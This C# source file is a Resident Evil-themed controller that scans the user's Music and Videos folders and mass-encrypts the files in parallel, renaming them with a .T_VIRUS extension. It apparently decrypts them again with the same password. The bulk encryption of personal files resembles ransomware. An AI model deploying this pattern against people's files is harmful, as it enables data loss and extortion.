using System;
using System.Collections.Generic;
using System.IO;
using System.Linq;
using System.Security;
using System.Threading.Tasks;

namespace SPIDERS_UMBRELLA_CORPORATION.Core
{
    public class RedQueenController
    {
        private readonly UmbrellaCrypto _crypto;
        private readonly HiveScanner _scanner;
        private readonly Action<string, bool> _logger;
        private readonly Action _onSubjectProcessed;
        private readonly Action _onCpuActivity;

        public RedQueenController(Action<string, bool> logger, Action onSubjectProcessed, Action onCpuActivity)
        {
            _crypto = new UmbrellaCrypto();
            _scanner = new HiveScanner();
            _logger = logger;
            _onSubjectProcessed = onSubjectProcessed;
            _onCpuActivity = onCpuActivity;
        }

        public async Task ExecuteProtocolAsync(SecureString password, bool encryptMode)
        {
            try
            {
                _logger(SecurityUtils.BioText(encryptMode ? "INITIATING LOCKDOWN..." : "INITIATING RESTORATION..."), false);
                _logger(SecurityUtils.BioText("TARGETING: MY MUSIC & MY VIDEOS"), false);

                var rootFolders = new[]
                {
                    Environment.GetFolderPath(Environment.SpecialFolder.MyMusic),
                    Environment.GetFolderPath(Environment.SpecialFolder.MyVideos)
                };

                // 1. Scan everything
                List<string> rawFiles = null;
                await Task.Run(() => { rawFiles = _scanner.Scan(rootFolders).ToList(); });

                // 2. Filter targets based on mode
                List<string> targets = new List<string>();
                if (rawFiles != null)
                {
                    if (encryptMode)
                    {
                        // Encrypt Mode: Ignore already encrypted files
                        targets = rawFiles.Where(f => !f.EndsWith(".T_VIRUS", StringComparison.OrdinalIgnoreCase)).ToList();
                    }
                    else
                    {
                        // Decrypt Mode: ONLY take encrypted files
                        targets = rawFiles.Where(f => f.EndsWith(".T_VIRUS", StringComparison.OrdinalIgnoreCase)).ToList();
                    }
                }

                if (targets == null || targets.Count == 0)
                {
                    _logger(SecurityUtils.BioText("NO VALID SUBJECTS FOUND."), true);
                    return;
                }

                _logger(SecurityUtils.BioText($"LOCKED ON: {targets.Count} FILES"), false);
                _logger(SecurityUtils.BioText("PROCESSING..."), false);

                await Task.Run(() =>
                {
                    // Keys for Encryption
                    byte[] masterSalt = null;
                    byte[] encKey = null;
                    byte[] macKey = null;

                    if (encryptMode)
                    {
                        masterSalt = _crypto.GenerateRandomBytes(32);
                        _crypto.DeriveKeys(password, masterSalt, out encKey, out macKey);
                    }

                    // Cache for Decryption (Speed Optimization)
                    byte[] cacheSalt = null;
                    byte[] cacheEnc = null;
                    byte[] cacheMac = null;

                    var pOptions = new ParallelOptions { MaxDegreeOfParallelism = 4 };

                    Parallel.ForEach(targets, pOptions, (file) =>
                    {
                        try
                        {
                            _onCpuActivity?.Invoke();
                            bool success = false;

                            if (encryptMode)
                            {
                                success = _crypto.EncryptFile(file, encKey, macKey, masterSalt);
                            }
                            else
                            {
                                // Using lock for cache safety
                                lock (this)
                                {
                                    success = _crypto.DecryptFile(file, password, ref cacheSalt, ref cacheEnc, ref cacheMac);
                                }
                            }

                            if (success)
                            {
                                _onSubjectProcessed?.Invoke();
                                string shortName = Path.GetFileName(file);
                                if (shortName.Length > 20) shortName = shortName.Substring(0, 17) + "...";
                                _logger(SecurityUtils.BioText($"PROCESSED: {shortName}"), false);
                            }
                        }
                        catch
                        {
                            // Swallow errors to keep batch moving
                        }
                    });

                    if (encKey != null) Array.Clear(encKey, 0, encKey.Length);
                    if (macKey != null) Array.Clear(macKey, 0, macKey.Length);
                });

                _logger(SecurityUtils.BioText("PROTOCOL COMPLETE."), false);
            }
            catch (Exception ex)
            {
                _logger(SecurityUtils.BioText($"CRITICAL FAILURE: {ex.Message}"), true);
            }
        }
    }
}